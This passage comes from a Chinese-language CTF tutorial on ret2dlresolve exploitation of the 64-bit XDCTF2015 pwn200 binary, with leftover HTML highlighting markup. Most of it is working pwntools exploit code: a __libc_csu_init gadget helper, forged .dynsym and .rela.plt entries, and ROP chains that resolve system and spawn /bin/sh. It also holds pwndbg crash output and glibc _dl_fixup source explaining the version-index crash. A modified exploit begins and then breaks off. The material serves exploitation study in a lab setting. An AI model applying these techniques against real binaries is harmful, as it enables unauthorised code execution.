bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400780</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40079A</span>
vuln_addr <span class="token operator">=</span> <span class="token number">0x400637</span>

<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">ret2dlresolve_x64</span><span class="token punctuation">(</span>elf<span class="token punctuation">,</span> store_addr<span class="token punctuation">,</span> func_name<span class="token punctuation">,</span> resolve_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

    rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rela.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    relaent <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_RELAENT"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># reloc entry size</span>

    dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    syment <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_SYMENT"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># symbol entry size</span>

    dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

    <span class="token comment" spellcheck="true"># construct fake function string</span>
    func_string_addr <span class="token operator">=</span> store_addr
    resolve_data <span class="token operator">=</span> func_name <span class="token operator">+</span> <span class="token string">"\x00"</span>

    <span class="token comment" spellcheck="true"># construct fake symbol</span>
    symbol_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> symbol_addr <span class="token operator">-</span> dynsym
    pad <span class="token operator">=</span> syment <span class="token operator">-</span> offset <span class="token operator">%</span> syment <span class="token comment" spellcheck="true"># align syment size</span>
    symbol_addr <span class="token operator">=</span> symbol_addr<span class="token operator">+</span>pad
    symbol <span class="token operator">=</span> p32<span class="token punctuation">(</span>func_string_addr<span class="token operator">-</span>dynstr<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    symbol_index <span class="token operator">=</span> <span class="token punctuation">(</span>symbol_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">24</span>
    resolve_data <span class="token operator">+=</span><span class="token string">'a'</span><span class="token operator">*</span>pad
    resolve_data <span class="token operator">+=</span> symbol

    <span class="token comment" spellcheck="true"># construct fake reloc </span>
    reloc_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> reloc_addr <span class="token operator">-</span> rel_plt
    pad <span class="token operator">=</span> relaent <span class="token operator">-</span> offset <span class="token operator">%</span> relaent <span class="token comment" spellcheck="true"># align relaent size</span>
    reloc_addr <span class="token operator">+=</span>pad
    reloc_index <span class="token operator">=</span> <span class="token punctuation">(</span>reloc_addr<span class="token operator">-</span>rel_plt<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">24</span>
    rinfo <span class="token operator">=</span> <span class="token punctuation">(</span>symbol_index<span class="token operator">&lt;&lt;</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7</span>
    write_reloc <span class="token operator">=</span> p64<span class="token punctuation">(</span>resolve_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rinfo<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    resolve_data <span class="token operator">+=</span><span class="token string">'a'</span><span class="token operator">*</span>pad
    resolve_data <span class="token operator">+=</span>write_reloc

    resolve_call <span class="token operator">=</span> p64<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>reloc_index<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resolve_data<span class="token punctuation">,</span> resolve_call


io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

store_addr <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x100</span>

<span class="token comment" spellcheck="true"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
resolve_data<span class="token punctuation">,</span> resolve_call <span class="token operator">=</span> ret2dlresolve_x64<span class="token punctuation">(</span>elf<span class="token punctuation">,</span> store_addr<span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>store_addr<span class="token punctuation">,</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># send resolve data</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>

rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span>
bin_sh_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>bin_sh_addr<span class="token punctuation">,</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>


rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x00000000004007a3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x00000000004007a3: pop rdi; ret; </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>resolve_call<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然而， 简单地运行后发现，程序崩溃了。</p>
<pre><code>─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*RAX  0x4003f6 ◂— 0x2000200020000
*RBX  0x601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fe00aa8e250 (write) ◂— lea    rax, [rip + 0x2e06a1]
*RCX  0x155f100000007
*RDX  0x155f1
*RDI  0x400398 ◂— 0x6f732e6362696c00
*RSI  0x601158 ◂— 0x1200200db8
*R8   0x0
 R9   0x7fe00af7a4c0 ◂— 0x7fe00af7a4c0
*R10  0x7fe00af98170 ◂— 0x0
 R11  0x246
*R12  0x6161616161616161 ('aaaaaaaa')
*R13  0x6161616161616161 ('aaaaaaaa')
*R14  0x6161616161616161 ('aaaaaaaa')
*R15  0x6161616161616161 ('aaaaaaaa')
*RBP  0x6161616161616161 ('aaaaaaaa')
*RSP  0x7fffb43c82a0 ◂— 0x0
*RIP  0x7fe00ad7eeb4 (_dl_fixup+116) ◂— movzx  eax, word ptr [rax + rdx*2]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7fe00ad7eeb4 &lt;_dl_fixup+116&gt;    movzx  eax, word ptr [rax + rdx*2]
   0x7fe00ad7eeb8 &lt;_dl_fixup+120&gt;    and    eax, 0x7fff
   0x7fe00ad7eebd &lt;_dl_fixup+125&gt;    lea    rdx, [rax + rax*2]
   0x7fe00ad7eec1 &lt;_dl_fixup+129&gt;    mov    rax, qword ptr [r10 + 0x2e0]
   0x7fe00ad7eec8 &lt;_dl_fixup+136&gt;    lea    r8, [rax + rdx*8]
   0x7fe00ad7eecc &lt;_dl_fixup+140&gt;    mov    eax, 0
   0x7fe00ad7eed1 &lt;_dl_fixup+145&gt;    mov    r9d, dword ptr [r8 + 8]
   0x7fe00ad7eed5 &lt;_dl_fixup+149&gt;    test   r9d, r9d
   0x7fe00ad7eed8 &lt;_dl_fixup+152&gt;    cmove  r8, rax
   0x7fe00ad7eedc &lt;_dl_fixup+156&gt;    mov    edx, dword ptr fs:[0x18]
   0x7fe00ad7eee4 &lt;_dl_fixup+164&gt;    test   edx, edx</code></pre><p>通过调试，我们发现，程序是在获取对应的版本号</p>
<ul>
<li>rax 为 0x4003f6，指向版本号数组</li>
<li>rdx 为 0x155f1，符号表索引，同时为版本号索引</li>
</ul>
<p>同时 rax + rdx*2 为 0x42afd8，而这个地址并不在映射的内存中。</p>
<pre><code>pwndbg&gt; print /x $rax + $rdx*2
$1 = 0x42afd8
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x600000           0x601000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x601000           0x602000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
    0x7fe00a97e000     0x7fe00ab65000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ab65000     0x7fe00ad65000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad65000     0x7fe00ad69000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad69000     0x7fe00ad6b000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad6b000     0x7fe00ad6f000 rw-p     4000 0      
    0x7fe00ad6f000     0x7fe00ad96000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af79000     0x7fe00af7b000 rw-p     2000 0      
    0x7fe00af96000     0x7fe00af97000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af97000     0x7fe00af98000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af98000     0x7fe00af99000 rw-p     1000 0      
    0x7fffb43a9000     0x7fffb43cb000 rw-p    22000 0      [stack]
    0x7fffb43fb000     0x7fffb43fe000 r--p     3000 0      [vvar]
    0x7fffb43fe000     0x7fffb4400000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</code></pre><p>那我们能不能想办法让它位于映射的内存中呢。估计有点难</p>
<ul>
<li>bss 的起始地址为 0x601050，那么索引值最小为 (0x601050-0x400398)/24=87517，即 0x4003f6 + 87517*2 = 0x42afb0</li>
<li>bss 可以最大使用的地址为 0x601fff，对应的索引值为(0x601fff-0x400398)/24=87684，即0x4003f6 + 87684*2 = 0x42b0fe</li>
</ul>
<p>显然都在非映射的内存区域。因此，我们得考虑考虑其它办法。通过阅读 dl_fixup 的代码</p>
<pre class="line-numbers language-c"><code class="language-c">        <span class="token comment" spellcheck="true">// 获取符号的版本信息</span>
        <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们发现，如果把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL，那程序就不会执行下面的代码，版本号就为 NULL，就可以正常执行代码。但是，这样的话，我们就需要知道 link_map 的地址了。 GOT 表的第 0 项（本例中 0x601008）存储的就是 link_map 的地址。</p>
<p>因此，我们可以</p>
<ul>
<li>泄露该处的地址</li>
<li>将 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL</li>
<li>最后执行利用脚本即可</li>
</ul>
<p>通过汇编代码，我们可以看出 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 的偏移为 0x1c8</p>
<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7fa4b09f7ea1 <_dl_fixup+97>     mov    rax, qword ptr [r10 + 0x1c8]
   0x7fa4b09f7ea8 <_dl_fixup+104>    xor    r8d, r8d
   0x7fa4b09f7eab <_dl_fixup+107>    test   rax, rax
   0x7fa4b09f7eae <_dl_fixup+110>    je     _dl_fixup+156 <_dl_fixup+156><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>因此，我们可以简单修改下 exp。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
<span class="token comment" spellcheck="true"># context.terminal = ["tmux","splitw","-h"]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400780</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40079A</span>
vuln_addr <span class="token operator">=</span> <span class="token number">0x400637</span>

<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">ret2dlresolve_x64</span><span class="token punctuation">(</span>elf<span class="token punctuation">,</span> store_addr<span class="token punctuation">,</span> func_name<span class="token punctuation">,</span> resolve_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

    rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rela.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    relaent <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_RELAENT"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># reloc entry size</span>

    dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    syment <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_SYMENT"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># symbol entry size</span>

    dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr


    <span class="token comment" spellcheck="true"># construct fake function string</span>
    func_string_addr <span class="token operator">=</span> store_addr
    resolve_data <span class="token operator">=</span> func_name <span class="token operator">+</span> <span class="token string">"\x00"</span>

    <span class="token comment" spellcheck="true"># construct fake symbol</span>
    symbol_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> symbol_addr <span class="token operator">-</span> dynsym
    pad <span class="token operator">=</span> syment <span class="token operator">-</span> offset <span class="token operator">%</span> syment <span class="token comment" spellcheck="true"># align syment size</span>
    symbol_addr <span class="token operator">=</span> symbol_addr<span class="token operator">+</span>pad
    symbol <span class="token operator">=</span> p32<span class="token punctuation">(</span>func_string_addr<span class="token operator">-</span>dynstr<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    symbol_index <span class="token operator">=</span> <span class="token punctuation">(</span>symbol_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">24</span>
    resolve_data <span class="token operator">+=</span><span class="token string">'a'</span><span class="token operator">*</span>pad
    resolve_data <span class="token operator">+=</span> symbol

    <span class="token comment" spellcheck="true"># construct fake reloc </span>
    reloc_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> reloc_addr <span class="token operator">-</span> rel_plt
    pad <span class="token operator">=</span> relaent <span class="token operator">-</span> offset <span class="token operator">%</span> relaent <span class="token comment" spellcheck="true"># align relaent size</span>
    reloc_addr <span class="token operator">+=</span>pad
    reloc_index <span class="token operator">=</span> <span class="token punctuation">(</span>reloc_addr<span class="token operator">-</span>rel_plt<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">24</span>
    rinfo <span class="token operator">=</span> <span class="token punctuation">(</span>symbol_index<span class="token operator">&lt;&lt;</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7</span>
    write_reloc <span class="token operator">=</span> p64<span class="token punctuation">(</span>resolve_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rinfo<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    resolve_data <span class="token operator">+=</span><span class="token string">'a'</span><span class="token operator">*</span>pad
    resolve_data <span class="token operator">+=</span>write_reloc

    resolve_call <span class="token operator">=</span> p64<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>reloc_index<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resolve_data<span class="token punctuation">,</span> resolve_call


io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

store_addr <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x100</span>

